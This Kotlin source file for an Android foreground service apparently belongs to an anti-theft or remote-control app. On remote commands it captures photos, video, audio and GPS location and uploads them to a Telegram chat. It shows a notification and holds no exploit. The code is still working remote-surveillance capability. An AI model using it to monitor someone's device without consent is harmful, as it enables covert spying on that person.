package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.*
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream

class ForegroundActionService : Service() {
    private var overlayView: OverlayCameraView? = null
    private var job: Job? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("ForegroundActionService", "onCreate called")
        // Do not call startForeground here; must be called with correct type in onStartCommand
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action") ?: ""
        val chatId = intent?.getStringExtra("chat_id")
        Log.d("ForegroundActionService", "onStartCommand received: action=$action, chatId=$chatId")
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            try {
                // Always show notification with correct FGS type before doing anything else
                withContext(Dispatchers.Main) {
                    showNotificationForAction(action)
                }
                // Handle action as before
                when (action) {
                    "photo" -> handleCameraAction("photo", intent, chatId)
                    "video" -> handleCameraAction("video", intent, chatId)
                    "audio" -> handleAudioRecording(intent, chatId)
                    "location" -> handleLocation(chatId)
                    "ring" -> handleRing()
                    "vibrate" -> handleVibrate()
                    else -> Log.e("ForegroundActionService", "Unknown action: $action")
                }
            } catch (e: Exception) {
                Log.e("ForegroundActionService", "Error in action $action", e)
                if (chatId != null) {
                    val deviceNickname = Preferences.getNickname(this@ForegroundActionService) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $action: ${formatDateTime(System.currentTimeMillis())}.")
                }
            } finally {
                withContext(Dispatchers.Main) { removeCameraOverlay() }
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?) {
        withContext(Dispatchers.Main) { showCameraOverlay() }
        val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
        val flash = intent?.getBooleanExtra("flash", false) ?: false
        val quality = intent?.getIntExtra("quality", 720) ?: 720
        val duration = intent?.getIntExtra("duration", 60) ?: 60
        val outputFile = File(cacheDir, generateFileName(type, quality))
        val actionTimestamp = System.currentTimeMillis()
        val result: Boolean = try {
            CameraBackgroundHelper.takePhotoOrVideo(
                context = this,
                surfaceHolder = overlayView!!.holder,
                type = type,
                cameraFacing = cameraFacing,
                flash = flash,
                videoQuality = quality,
                durationSec = duration,
                file = outputFile
            )
        } catch (e: Exception) {
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $type: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
            }
            withContext(Dispatchers.Main) { removeCameraOverlay() }
            return
        }
        withContext(Dispatchers.Main) { removeCameraOverlay() }
        if (result && chatId != null) {
            UploadManager.queueUpload(outputFile, chatId, type, actionTimestamp)
        } else if (!result && chatId != null) {
            val deviceNickname = Preferences.getNickname(this) ?: "Device"
            UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Failed to capture $type (permission denied or hardware error) at ${formatDateTime(actionTimestamp)}.")
        }
    }

    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?) {
        val duration = intent?.getIntExtra("duration", 60) ?: 60
        val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
        val actionTimestamp = System.currentTimeMillis()
        try {
            AudioBackgroundHelper.recordAudio(this, outputFile, duration)
            if (chatId != null) {
                UploadManager.queueUpload(outputFile, chatId, "audio", actionTimestamp)
            }
        } catch (e: Exception) {
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in audio recording: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
            }
        }
    }

    private fun handleRing() {
        val duration = 5
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
        try {
            audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0)
            val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
            ringtone.play()
            Handler(Looper.getMainLooper()).postDelayed({
                ringtone.stop()
                audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
            }, (duration * 1000).toLong())
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Ring error: $e")
        }
    }

    private fun handleVibrate() {
        val duration = 2000L
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(duration)
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Vibrate error: $e")
        }
    }

    private suspend fun handleLocation(chatId: String?) {
        val actionTimestamp = System.currentTimeMillis()
        try {
            val loc = LocationBackgroundHelper.getLastLocation(this)
            if (loc == null) {
                if (chatId != null) {
                    val deviceNickname = Preferences.getNickname(this) ?: "Device"
                    UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Location unavailable (GPS off, permission denied, or no recent fix) at ${formatDateTime(actionTimestamp)}.")
                }
                return
            }
            val locationFile = File(cacheDir, "location_${nowString()}.json")
            FileOutputStream(locationFile).use { out ->
                out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
            }
            if (chatId != null) {
                UploadManager.queueUpload(locationFile, chatId, "location", actionTimestamp)
            }
        } catch (e: Exception) {
            if (chatId != null) {
                val deviceNickname = Preferences.getNickname(this) ?: "Device"
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in location service: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
            }
        }
    }

    private fun showCameraOverlay() {
        if (overlayView == null) {
            overlayView = OverlayCameraView(this)
            overlayView?.addToWindow()
        }
    }
    private fun removeCameraOverlay() {
        overlayView?.removeFromWindow()
        overlayView = null
    }
    override fun onDestroy() {
        job?.cancel()
        removeCameraOverlay()
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null

    /**
     * Show notification and start foreground with the correct type for the action.
     * For vibrate/ring, use FOREGROUND_SERVICE_TYPE_NONE.
     */
    private fun showNotificationForAction(action: String) {
        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Remote Control Service")
            .setContentText("Running background actions...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
        val type = when (action) {
            "photo", "video" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    0x00000001 // Service.FOREGROUND_SERVICE_TYPE_CAMERA
                else 0
            }
            "audio" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    0x00000004 // Service.FOREGROUND_SERVICE_TYPE_MICROPHONE
                else 0
            }
            "location" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    0x00000002 // Service.FOREGROUND_SERVICE_TYPE_LOCATION
                else 0
            }
            // For vibrate and ring, always use NONE (safe for Android 14+)
            "vibrate", "ring" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    0x00000000 // Service.FOREGROUND_SERVICE_TYPE_NONE
                else 0
            }
            else -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    0x00000000 // Service.FOREGROUND_SERVICE_TYPE_NONE
                else 0
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, type)
        } else {
            startForeground(1, notification)
        }
    }

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, ForegroundActionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun stop(context: Context) {
            context.stopService(Intent(context, ForegroundActionService::class.java))
        }
        fun isRunning(context: Context): Boolean = false

        fun startCameraAction(context: Context, type: String, options: JSONObject, chatId: String?) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", type)
            intent.putExtra("camera", options.optString("camera", "rear"))
            if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
            if (type == "video") {
                if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
                if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
            }
            chatId?.let { intent.putExtra("chat_id", it) }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startAudioAction(context: Context, options: JSONObject, chatId: String?) {
            val duration = options.optInt("duration", 60)
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "audio")
            intent.putExtra("duration", duration)
            chatId?.let { intent.putExtra("chat_id", it) }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startLocationAction(context: Context, chatId: String?) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "location")
            chatId?.let { intent.putExtra("chat_id", it) }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startRingAction(context: Context, options: JSONObject) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "ring")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startVibrateAction(context: Context, options: JSONObject) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "vibrate")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun generateFileName(type: String, quality: Int): String {
            val sdf = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US)
            return if (type == "video") {
                "${type}_${quality}p_${sdf.format(java.util.Date())}.mp4"
            } else {
                "${type}_${sdf.format(java.util.Date())}.jpg"
            }
        }
        fun nowString(): String = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
    }
}